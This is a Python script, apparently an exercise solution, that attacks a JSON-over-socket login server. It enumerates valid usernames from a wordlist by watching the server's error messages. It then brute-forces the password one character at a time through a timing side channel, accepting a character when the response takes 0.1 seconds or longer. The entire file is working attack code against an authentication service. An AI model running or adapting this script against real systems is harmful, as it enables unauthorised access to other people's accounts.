import itertools
import json
import socket
import string
import sys
import os
import time


def send_message(data):
    client_socket.send(json.dumps(data).encode())


def receive_message():
    return json.loads(client_socket.recv(1024).decode())


def generate_password():
    for symbol in itertools.product(string.ascii_letters + string.digits, repeat=1):
        yield "".join(symbol)


def login_generate():
    file_path = os.path.join(os.path.dirname(__file__), "logins.txt")
    with open(file_path, "r") as file:
        logins = file.read().splitlines()
        for log in logins:
            data_dict = {'login': log.rstrip(), 'password': ''}
            yield data_dict


args = sys.argv

with socket.socket() as client_socket:
    address = (str(args[1]), int(args[2]))
    client_socket.connect(address)
    true_login = None
    for login in login_generate():
        send_message(login)
        response = receive_message()
        if response["result"] == "Wrong password!":
            true_login = login['login']
            break

    dct_with_login = {'login': true_login, 'password': " "}
    password = ""
    while True:
        for c in generate_password():
            attempted_password = password + c
            dct_with_login['password'] = attempted_password
            client_socket.send(json.dumps(dct_with_login).encode())

            start = time.perf_counter()
            response = receive_message()
            end = time.perf_counter()
            if response["result"] == 'Connection success!':
                print(json.dumps(dct_with_login))
                sys.exit()

            if end - start >= 0.1:
                password = attempted_password
                break
